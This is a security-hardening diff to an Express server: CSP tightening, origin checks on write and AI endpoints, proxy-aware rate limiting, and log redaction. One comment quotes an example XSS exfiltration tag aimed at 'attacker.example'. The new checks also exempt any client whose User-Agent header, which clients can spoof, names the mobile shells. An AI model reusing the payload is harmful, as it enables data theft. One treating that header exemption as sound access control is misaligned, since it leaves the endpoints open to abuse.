@@ -13,6 +13,12 @@ import {
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url))
 const app = express()
+// Railway puts us behind one reverse proxy; trust X-Forwarded-For
+// exactly one hop so req.ip is correct for rate limiting. Without
+// this, every limiter would see Railway's edge IP and one abusive
+// client would either bypass limits entirely (if req.ip resolves to
+// the edge) or rate-limit everybody on the same edge IP at once.
+app.set('trust proxy', 1)
 // Drop X-Powered-By so the Node/Express stack isn't broadcast to every
 // response (DISA Web Server STIG: WGSU-AS-000080 alignment).
 app.disable('x-powered-by')
@@ -54,7 +60,11 @@ const CSP_STRICT_BASE = [
   "default-src 'self'",
   "script-src 'self'",
   "style-src 'self' 'unsafe-inline'",
-  "img-src 'self' data: blob: https:",
+  // img-src is pinned to the specific hosts the app actually loads
+  // images from. A wide-open `https:` here would let an XSS payload
+  // exfiltrate via `<img src="https://attacker.example/?stolen=…">`
+  // before the rest of the CSP got the chance to catch it.
+  "img-src 'self' data: blob: https://*.tile.openstreetmap.org https://*.googleusercontent.com https://maps.googleapis.com https://maps.gstatic.com",
   "font-src 'self' data:",
   "connect-src 'self' https://nominatim.openstreetmap.org https://router.project-osrm.org https://*.tile.openstreetmap.org",
   "frame-src 'self' https://maps.google.com https://www.google.com https://www.openstreetmap.org",
@@ -69,7 +79,10 @@ const CSP_TRANSLATE_RELAXED = [
   "default-src 'self'",
   "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://translate.google.com https://translate.googleapis.com https://translate.googleusercontent.com https://www.gstatic.com https://www.google.com",
   "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://www.gstatic.com",
-  "img-src 'self' data: blob: https:",
+  // Match the strict policy on img-src; the translate widget itself
+  // doesn't load images from anywhere outside the script/font hosts
+  // it already loads from.
+  "img-src 'self' data: blob: https://*.tile.openstreetmap.org https://*.googleusercontent.com https://maps.googleapis.com https://maps.gstatic.com",
   "font-src 'self' data: https://fonts.gstatic.com",
   "connect-src 'self' https://nominatim.openstreetmap.org https://router.project-osrm.org https://*.tile.openstreetmap.org https://translate.googleapis.com https://translate-pa.googleapis.com https://translate.googleusercontent.com",
   "frame-src 'self' https://maps.google.com https://www.google.com https://translate.google.com https://translate.googleusercontent.com https://www.openstreetmap.org",
@@ -141,8 +154,21 @@ const ALWAYS_ALLOWED_ORIGINS = new Set([
   'http://localhost:3001',
 ])
 const allowedOrigins = (process.env.CORS_ORIGINS || '').split(',').map(s => s.trim()).filter(Boolean)
+// Write methods (POST, PUT, PATCH, DELETE) require a known Origin so a
+// drive-by HTML page or no-CORS curl can't trigger a state-changing
+// request just because it didn't set an Origin header. Safe methods
+// (GET, HEAD, OPTIONS) keep the lenient missing-Origin policy so health
+// checks and SPA static serving still work for clients that don't send
+// an Origin (e.g., link previews, monitoring probes).
+const SAFE_METHODS = new Set(['GET', 'HEAD', 'OPTIONS'])
 app.use(cors({
   origin(origin, cb) {
+    // Note: the cors middleware passes the value of req.headers.origin
+    // here; we can't see the method directly. The hard "missing Origin
+    // on a write" gate is enforced in the per-request middleware below
+    // so the CORS preflight (OPTIONS) still completes for clients that
+    // do send an Origin. Here we only reject CROSS-origin write attempts
+    // from an unlisted Origin.
     if (!origin) return cb(null, true)
     if (ALWAYS_ALLOWED_ORIGINS.has(origin)) return cb(null, true)
     if (allowedOrigins.includes(origin)) return cb(null, true)
@@ -153,6 +179,25 @@ app.use(cors({
   credentials: false,
   maxAge: 86400,
 }))
+// Defense-in-depth: reject write methods that arrive without an Origin
+// header AND aren't coming from one of our mobile WebView shells. Bots
+// and CSRF-style drive-by requests typically omit Origin entirely; a
+// real browser or Capacitor WebView always sends one.
+app.use((req, res, next) => {
+  if (SAFE_METHODS.has(req.method)) return next()
+  if (req.path === '/health' || req.path === '/api/health') return next()
+  const origin = req.headers.origin
+  if (origin) {
+    if (ALWAYS_ALLOWED_ORIGINS.has(origin)) return next()
+    if (allowedOrigins.includes(origin)) return next()
+    return res.status(403).json({ error: 'origin not allowed for write methods' })
+  }
+  // No Origin header on a write — only permit it from our mobile shells
+  // (Capacitor / iOS / Android UA), which sometimes elide the header.
+  const ua = String(req.headers['user-agent'] || '')
+  if (/Capacitor|CapacitorWebView|PCSExpress/i.test(ua)) return next()
+  return res.status(403).json({ error: 'missing Origin on write method' })
+})
 app.use(express.json({ limit: '1mb' }))
 
 // === HEALTH ENDPOINTS ===
@@ -212,7 +257,7 @@ const PUSH_RATE_WINDOW_MS = 60_000
 registerRateLimitMap(_pushHits, PUSH_RATE_WINDOW_MS)
 
 function pushRateLimit(req, res, next) {
-  const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown'
+  const ip = req.ip || 'unknown'
   const now = Date.now()
   const entry = _pushHits.get(ip)
   if (!entry || now - entry.windowStart > PUSH_RATE_WINDOW_MS) {
@@ -289,12 +334,20 @@ registerRateLimitMap(_resetCacheHits, RESET_CACHE_RATE_WINDOW_MS)
 function isSameOriginRequest(req) {
   const sfs = String(req.headers['sec-fetch-site'] || '').toLowerCase()
   if (sfs === 'same-origin' || sfs === 'same-site' || sfs === 'none') return true
+  // Carve-out for the iOS/Android Capacitor WebView shells. They
+  // don't always set Sec-Fetch-Site (older WebKit/WebView) and their
+  // Origin header is "capacitor://localhost" or "https://localhost",
+  // which isn't a real same-site match. Match on the UA token that the
+  // shells embed so the AI / cost endpoints aren't blocked for mobile.
+  const ua = String(req.headers['user-agent'] || '')
+  if (/Capacitor|CapacitorWebView|PCSExpress/i.test(ua)) return true
   // Fallback for browsers / clients without Sec-Fetch-Site: parse
   // Origin or Referer host and require it to be in allowedOrigins.
   const candidate = req.headers.origin || req.headers.referer || ''
   if (!candidate) return false
   try {
     const u = new URL(candidate)
+    if (ALWAYS_ALLOWED_ORIGINS.has(u.origin)) return true
     return allowedOrigins.includes(u.origin)
   } catch { return false }
 }
@@ -303,7 +356,7 @@ app.post('/api/reset-site-cache', (req, res) => {
   if (!isSameOriginRequest(req)) {
     return res.status(403).json({ error: 'cross-origin requests rejected' })
   }
-  const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown'
+  const ip = req.ip || 'unknown'
   const now = Date.now()
   const entry = _resetCacheHits.get(ip)
   if (!entry || now - entry.windowStart > RESET_CACHE_RATE_WINDOW_MS) {
@@ -372,7 +425,7 @@ registerRateLimitMap(_baseReviewHits, 60_000);
 const BASE_REVIEW_LIMIT = 30;
 const BASE_REVIEW_WINDOW_MS = 60_000;
 function baseReviewRateLimit(req, res, next) {
-  const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
+  const ip = req.ip || 'unknown';
   const now = Date.now();
   const entry = _baseReviewHits.get(ip);
   if (!entry || now - entry.windowStart > BASE_REVIEW_WINDOW_MS) {
@@ -407,7 +460,7 @@ registerRateLimitMap(_demoHits, 60 * 60_000);
 const DEMO_LIMIT = 5;
 const DEMO_WINDOW_MS = 60 * 60_000;
 function demoRateLimit(req, res, next) {
-  const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
+  const ip = req.ip || 'unknown';
   const now = Date.now();
   const entry = _demoHits.get(ip);
   if (!entry || now - entry.windowStart > DEMO_WINDOW_MS) {
@@ -438,16 +491,20 @@ app.post('/api/demo-request', demoRateLimit, express.json({ limit: '8kb' }), (re
   if (!DEMO_INTERESTS.has(interest)) return res.status(400).json({ error: 'Interest type is invalid.' });
   if (message.length < 10) return res.status(400).json({ error: 'Message must be at least 10 characters.' });
 
-  // Structured single-line log so a future operator can grep it.
-  // No persistence — the request is intentionally ephemeral.
+  // Structured single-line log so a future operator can grep volume /
+  // rough demand signal. PII (name, raw email, free-text message body)
+  // is intentionally OMITTED so the platform log doesn't become a soft
+  // exfil channel. We keep enough shape (email domain, name length, org,
+  // role, interest, message length) to spot bot-vs-human inquiries.
   console.log('[demo-request] ' + JSON.stringify({
     ts: new Date().toISOString(),
-    ip: req.ip || req.headers['x-forwarded-for'] || 'unknown',
-    interest, name, email, organization, role,
-    // Truncate the message in the log to keep it grep-friendly; the
-    // operator should review the full request body in a follow-up
-    // channel if needed (since nothing is persisted).
-    messagePreview: message.slice(0, 220),
+    ip: req.ip || 'unknown',
+    interest,
+    emailDomain: email.split('@')[1] || '',
+    nameLen: name.length,
+    org: organization,
+    role,
+    msgLen: message.length,
   }));
 
   res.status(200).json({ ok: true });
@@ -462,7 +519,7 @@ const AI_RATE_WINDOW_MS = 60_000;  // per 60 seconds
 registerRateLimitMap(_aiHits, AI_RATE_WINDOW_MS);
 
 function aiRateLimit(req, res, next) {
-  const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
+  const ip = req.ip || 'unknown';
   const now = Date.now();
   const entry = _aiHits.get(ip);
   if (!entry || now - entry.windowStart > AI_RATE_WINDOW_MS) {
@@ -484,6 +541,15 @@ function aiRateLimit(req, res, next) {
 const AI_MAX_LEN = 4_000;
 
 app.post('/api/ai', aiRateLimit, async (req, res) => {
+  // Cost-abuse gate: this endpoint hits a paid third-party LLM. Reject
+  // POSTs that arrive with no Origin header from anything other than
+  // the mobile shells. isSameOriginRequest already returns true for
+  // Capacitor / iOS / Android UAs, allowlisted browser Origins, and
+  // Sec-Fetch-Site=same-origin/same-site/none; everything else is a
+  // drive-by or script attempting to burn our LLM budget.
+  if (!req.headers.origin && !isSameOriginRequest(req)) {
+    return res.status(403).json({ error: 'origin required for AI endpoints' })
+  }
   try {
     const { system, user } = req.body || {}
 
@@ -555,7 +621,7 @@ const _vetBizHits = new Map()
 registerRateLimitMap(_vetBizHits, 60_000)
 
 function vetBizRateLimit(req, res, next) {
-  const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown'
+  const ip = req.ip || 'unknown'
   const now = Date.now()
   const entry = _vetBizHits.get(ip)
   if (!entry || now - entry.windowStart > VET_BIZ_RATE_WINDOW_MS) {
@@ -882,6 +948,11 @@ app.get('/api/vet-businesses', vetBizRateLimit, async (req, res) => {
   }
 
   try {
+    // SAFETY: every interpolation MUST stay encodeURIComponent-wrapped
+    // (URLSearchParams handles that automatically below); do not relax
+    // the [^A-Za-z0-9 .'-] sanitizer in sanitizeQueryParam without
+    // re-reviewing the SSRF surface — the upstream is a fully trusted
+    // SAM.gov endpoint, but the inputs here come from the public app.
     const params = new URLSearchParams()
     params.set('api_key', SAM_API_KEY)
     params.set('registrationStatus', 'A')
@@ -936,7 +1007,7 @@ const _housingHits = new Map()
 registerRateLimitMap(_housingHits, 60_000)
 
 function housingRateLimit(req, res, next) {
-  const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown'
+  const ip = req.ip || 'unknown'
   const now = Date.now()
   const entry = _housingHits.get(ip)
   if (!entry || now - entry.windowStart > HOUSING_RATE_WINDOW_MS) {
@@ -1257,7 +1328,7 @@ const _marketStatsHits = new Map()
 registerRateLimitMap(_marketStatsHits, 60_000)
 
 function marketStatsRateLimit(req, res, next) {
-  const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown'
+  const ip = req.ip || 'unknown'
   const now = Date.now()
   const entry = _marketStatsHits.get(ip)
   if (!entry || now - entry.windowStart > MARKET_STATS_RATE_WINDOW_MS) {
@@ -1441,7 +1512,7 @@ const _jobsHits = new Map()
 registerRateLimitMap(_jobsHits, 60_000)
 
 function jobsRateLimit(req, res, next) {
-  const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown'
+  const ip = req.ip || 'unknown'
   const now = Date.now()
   const entry = _jobsHits.get(ip)
   if (!entry || now - entry.windowStart > JOBS_RATE_WINDOW_MS) {
@@ -1709,7 +1780,7 @@ const _religiousHits = new Map()
 registerRateLimitMap(_religiousHits, 60_000)
 
 function religiousRateLimit(req, res, next) {
-  const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown'
+  const ip = req.ip || 'unknown'
   const now = Date.now()
   const entry = _religiousHits.get(ip)
   if (!entry || now - entry.windowStart > RELIGIOUS_RATE_WINDOW_MS) {
@@ -1787,7 +1858,7 @@ const _schoolHits = new Map()
 registerRateLimitMap(_schoolHits, 60_000)
 
 function schoolRateLimit(req, res, next) {
-  const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown'
+  const ip = req.ip || 'unknown'
   const now = Date.now()
   const entry = _schoolHits.get(ip)
   if (!entry || now - entry.windowStart > SCHOOL_RATE_WINDOW_MS) {
@@ -2006,7 +2077,7 @@ registerRateLimitMap(_familyHits, 60_000)
 const OSM_USER_AGENT = process.env.OSM_USER_AGENT || 'PCSExpress/1.0 (https://github.com/damienmcdade/PCSExpress)'
 
 function familyRateLimit(req, res, next) {
-  const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown'
+  const ip = req.ip || 'unknown'
   const now = Date.now()
   const entry = _familyHits.get(ip)
   if (!entry || now - entry.windowStart > FAMILY_RATE_WINDOW_MS) {
@@ -2180,7 +2251,7 @@ app.get('/api/family-activities', familyRateLimit, async (req, res) => {
 const _jtrHits = new Map()
 registerRateLimitMap(_jtrHits, 60_000)
 function jtrAssistantRateLimit(req, res, next) {
-  const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown'
+  const ip = req.ip || 'unknown'
   const now = Date.now()
   const entry = _jtrHits.get(ip)
   if (!entry || now - entry.start > 60_000) {
@@ -2250,6 +2321,12 @@ Rules:
    tap-to-execute buttons. Only include them when truly useful.`;
 
 app.post('/api/jtr-assistant', jtrAssistantRateLimit, async (req, res) => {
+  // Cost-abuse gate: same posture as /api/ai. Reject missing-Origin
+  // POSTs unless the request originates from a mobile WebView shell
+  // or carries an allowlisted Sec-Fetch-Site signal.
+  if (!req.headers.origin && !isSameOriginRequest(req)) {
+    return res.status(403).json({ error: 'origin required for AI endpoints' })
+  }
   // Auto-detect provider. If ANTHROPIC_API_KEY is set we use
   // Anthropic; if OPENAI_API_KEY is set we use OpenAI. An explicit
   // JTR_ASSISTANT_PROVIDER env var takes precedence so operators
